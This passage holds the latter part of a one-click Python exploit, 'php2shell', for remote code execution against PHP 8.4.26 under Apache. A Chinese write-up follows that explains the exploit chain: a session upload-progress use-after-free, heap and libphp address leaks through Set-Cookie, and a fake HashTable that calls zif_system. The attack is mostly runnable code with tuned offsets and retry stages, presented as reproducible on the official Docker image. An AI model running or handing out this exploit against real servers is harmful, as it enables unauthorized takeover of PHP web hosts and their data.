        """Write the fake reference over PS(http_session_vars) and execute."""
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        specs = self.stage3_pads
        for i, (nl, vl) in enumerate(specs):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.profile == "bookworm":
            # Keep PS(id) valid: php_session_initialize then leaves
            # send_cookie=0, so B's init does not allocate the Set-Cookie
            # header at R0+16 (which would clobber val.type).
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)
        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            # The bookworm reference is still alive (rc=2).  A 15-byte
            # bin-40 zend_string lands its chars exactly at
            # PS(http_session_vars): keep gc (rc=1, IS_REFERENCE), rewrite the
            # low 7 bytes of val.value to the fake HashTable, and let the
            # high byte stay 0x00 (canonical 0x00007f... pointer).
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)
def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell one-click exploit (official php:8.4.26-apache / lab)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("-u", "--url", required=True,
                    help="target PHP page, e.g. http://127.0.0.1:8088/index.php")
    ap.add_argument("-c", "--cmd", default=DEFAULT_CMD,
                    help=f"command to execute (max {MAX_CMD} bytes)")
    ap.add_argument("--proof-file", default=DEFAULT_PROOF,
                    help="read this local file after exploitation; '' disables")
    ap.add_argument("--fetch", default="",
                    help="GET this path afterwards (for commands writing to webroot)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help=f"offset of zif_system in libphp.so (default: offsets file or 0x{ZIF_OFFSET:x})")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help=f"offset of ZVAL_PTR_DTOR in libphp.so (default: offsets file or 0x{DTOR_OFFSET:x})")
    ap.add_argument("--profile", choices=("lab", "bookworm"), default="bookworm",
                    help="target build profile: bookworm (official image, default) or lab (Apache 2.4.68)")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None,
                    help="chunk-relative offset of the 167-byte live string")
    ap.add_argument("--offsets-file", default=DEFAULT_OFFSETS,
                    help="read libphp offsets from this file ('' to disable)")
    ap.add_argument("--docker-container", default="php2shell-target",
                    help="container used to auto-derive offsets on localhost")
    ap.add_argument("--no-auto-offsets", action="store_true",
                    help="never run docker/offsets.py automatically")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="size of the OOM field; must exceed memory_limit")
    ap.add_argument("--timeout", type=float, default=30.0, help="per-request timeout")
    ap.add_argument("--no-pre-rotate", action="store_true",
                    help="skip the initial worker rotation")
    ap.add_argument("--no-retry-rotate", action="store_true",
                    help="do not rotate between failed stage attempts")
    ap.add_argument("--retries", type=int, default=3,
                    help="attempts per leak stage; stage 3 uses retries+2")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()
    if len(args.cmd.encode()) > MAX_CMD:
        ap.error(f"--cmd is limited to {MAX_CMD} bytes by the 167-byte carrier")
    if args.htdata_offset is None:
        args.htdata_offset = (BOOKWORM_HTDATA_OFFSET if args.profile == "bookworm"
                              else HTDATA_OFFSET)
    local_offsets = read_offsets_file(args.offsets_file)
    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet)
    # A local docker target may be built from a different image/toolchain than
    # the lab; ask the container for its real libphp offsets once.
    if (not local_offsets and not args.no_auto_offsets and args.offsets_file
            and t.host in ("127.0.0.1", "localhost", "::1")):
        helper = os.path.join(_HERE, "docker", "offsets.py")
        if os.path.exists(helper):
            if not args.quiet:
                print("[*] no offsets file; reading libphp symbols from "
                      f"container {args.docker_container}", flush=True)
            try:
                subprocess.run(
                    [sys.executable, helper, args.docker_container, args.offsets_file],
                    check=False, timeout=60,
                    stdout=None if not args.quiet else subprocess.DEVNULL,
                    stderr=None if not args.quiet else subprocess.DEVNULL,
                )
            except (OSError, subprocess.SubprocessError):
                pass
            local_offsets = read_offsets_file(args.offsets_file)
    if args.zif_offset is None:
        args.zif_offset = local_offsets.get("ZIF_OFFSET", ZIF_OFFSET)
    if args.dtor_offset is None:
        args.dtor_offset = local_offsets.get("DTOR_OFFSET", DTOR_OFFSET)
    ex = Exploit(t, args.cmd, zif_offset=args.zif_offset,
                 dtor_offset=args.dtor_offset, htdata_offset=args.htdata_offset,
                 huge_mb=args.huge_mb, verbose=not args.quiet, profile=args.profile)
    t.log(f"[*] target {args.url} (cmd={args.cmd!r})")
    if local_offsets:
        t.log(f"[*] offsets loaded from {args.offsets_file}")
    t.log(f"[*] offsets: zif=0x{args.zif_offset:x} dtor=0x{args.dtor_offset:x} "
          f"htdata=0x{args.htdata_offset:x}")
    def rotate_after_failure() -> None:
        if not args.no_retry_rotate:
            ex.rotate()
    if not args.no_pre_rotate:
        ex.rotate()
    # ---- stage 1 ----
    chunk = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 1: heap leak (attempt {attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
            t.log(f"[+] chunk base = 0x{chunk:x}")
            break
        t.log("[-] heap leak missed")
        rotate_after_failure()
    if not chunk:
        print("HEAP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()  # each stage needs a fresh worker
    # ---- stage 2 ----
    libphp = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 2: libphp leak (attempt {attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            t.log(f"[+] libphp base = 0x{libphp:x}")
            break
        t.log("[-] libphp leak missed")
        rotate_after_failure()
    if not libphp:
        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()
    # ---- stage 3 ----
    htdata = chunk + args.htdata_offset
    zif = libphp + args.zif_offset
    t.log(f"[*] stage 3: HTDATA=0x{htdata:x} ZIF=0x{zif:x}")
    proof = ""
    if args.proof_file:
        try:
            if os.path.exists(args.proof_file):
                os.unlink(args.proof_file)
        except OSError:
            pass
    for attempt in range(1, args.retries + 3):
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            t.log(f"[-] request error: {e}")
        time.sleep(0.8)
        if args.proof_file:
            try:
                if os.path.exists(args.proof_file):
                    with open(args.proof_file, "rb") as f:
                        proof = f.read().decode("latin1").strip()
            except OSError:
                pass
        if not proof and args.fetch:
            status, body = t.get(args.fetch)
            if status == 200:
                proof = body.decode("latin1").strip()
        if proof:
            t.log(f"[+] W3 attempt {attempt}")
            print(f"PROOF: {proof}")
            return 0
        t.log(f"[-] stage 3 attempt {attempt} no proof yet")
        rotate_after_failure()
    print("EXPLOIT_FAILED (no proof; the command may still have executed blind)",
          file=sys.stderr)
    return 1
if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
```  
  
  
ok说点有营养的：  
  
漏洞面是 session.upload_progress 在 RINIT 之前触发的 session 初始化，以及 OOM bailout 后跨请求残留的悬空指针。下面以 lab 构建为例；官方镜像的 bookworm 标定值见 exp 末尾。  
  
整条链的攻击流量全部是普通 multipart HTTP，目标页面只有 <?php echo "OK\n"; ?>：  
  
worker 轮换：A_bigfields（3MB 存活 POST 字段 + 12MB OOM）后紧跟一个会初始化 session 的 B，child 以 SIGABRT 退出；prefork fork 出的新 worker 继承相同的 libphp/chunk 映射。  
  
堆泄漏：A 用 1001 个字段触发 max_input_vars 警告（display_errors=On → headers_sent=1），PHPSESSID=\x00 生成新 id 并置 send_cookie=1，最后的 12MB 字段在 php_session_initialize() 内 OOM，PS(http_session_vars) 悬空。B 用 56B multipart 原始值缓冲区重占旧 reference，并用存活的 192B zend_string 承载 fake HashTable；php_url_encode() 越界读把 Zend MM chunk 指针写进 Set-Cookie（4096B、98 个指针）。  
  
libphp 泄漏：A 把悬空 PS(id) 放到 chunk+0xb7400；B 的 56B HashTable 页让 ZSTR_LEN(PS(id)) 读到 nTableSize=16，数据区正好是 nNextFreeElement|pDestructor；pDestructor = ZVAL_PTR_DTOR = libphp+0x613c50，从 Set-Cookie 解出 libphp base。  
  
命令执行：A 用 6 个 pad 把悬空 reference 固定到 R0=chunk+0x24e0；B 用 55B raw buffer 覆盖 R0-0x10，fake HashTable 放在 chunk+0x6e0d8 的 167B 存活字符串里，pDestructor = zif_system = libphp+0x43a870。触发链：  
```
php_session_track_init()
  zval_ptr_dtor(PS(http_session_vars))
    zend_reference_destroy(R0)
      zval_ptr_dtor(&ref->val)          # IS_ARRAY_EX
        zend_array_destroy(fake HT)
          zend_hash_destroy(fake HT)
            pDestructor(&bucket->val)   # zif_system
```  
  
而终端只使用 libphp 内的 zif_system，不需要 libc。  
  
不要看到RCE就很上头，请继续往下看：  
  
页面为什么不需要 session_start()：A/B 的 session 初始化发生在 RINIT 前的 multipart 回调里（FILE_START → php_session_rfc1867_update → php_session_initialize()；END → php_session_rfc1867_cleanup → php_session_initialize()），与脚本内容无关。  
  
指针为什么会悬空：A 在 php_session_initialize() 内 OOM bailout，PS(http_session_vars) / PS(id) 没有被清空；下一个请求初始化 session 时 php_session_track_init() 对它执行 zval_ptr_dtor。  
  
为什么能重占：multipart 普通字段的值在请求解析阶段被分配成 zend_string；56B block、55B reference、167B 字符串这些尺寸正好覆盖旧 reference、承载 fake HashTable。  
  
为什么能过 ASLR：两次 Set-Cookie 越界读分别给出 chunk base 和 libphp base；阶段之间用纯 HTTP abort/fork 换 worker，地址空间不变；终端不依赖 libc。  
  
历史线：session_unset() + 用户态 __destruct 的 Defect D（arData UAF）已在自定义 PHP 页面取得 RCE（NOASLR_REPORT.md），但违反“不写特定 PHP”约束，仅作机制参考。  
  
地址/偏移（相对 chunk 或 libphp，与 ASLR 无关）：  
  
复现声明  
  
一个 exp 复现全部：python3 exploit.py -u ... 一条命令完成 worker 轮换、堆泄漏、libphp 泄漏和 zif_system 执行；不需要目标侧文件、不需要 session_start()、不需要本地信号。  
  
纯 HTTP：攻击流量只有 multipart POST，目标 webroot 只有 <?php echo "OK\n"; ?>。  
  
环境：官方 php:8.4.26-apache（PHP 8.4.26 / Debian 12 / Apache 2.4.69 prefork）+ docker/php.ini、docker/apache.conf，默认 --profile bookworm，实测 3/3。原 lab 构建（Apache 2.4.68、最小 PHP）用 --profile lab；两套 profile 的 chunk 偏移和 stage3 触发方式已分别标定。  
```
当前 RCE 要求 display_errors=1、memory_limit=8M、max_input_vars=1000、session.use_cookies=1、session.use_strict_mode=0
```  
  
  
  
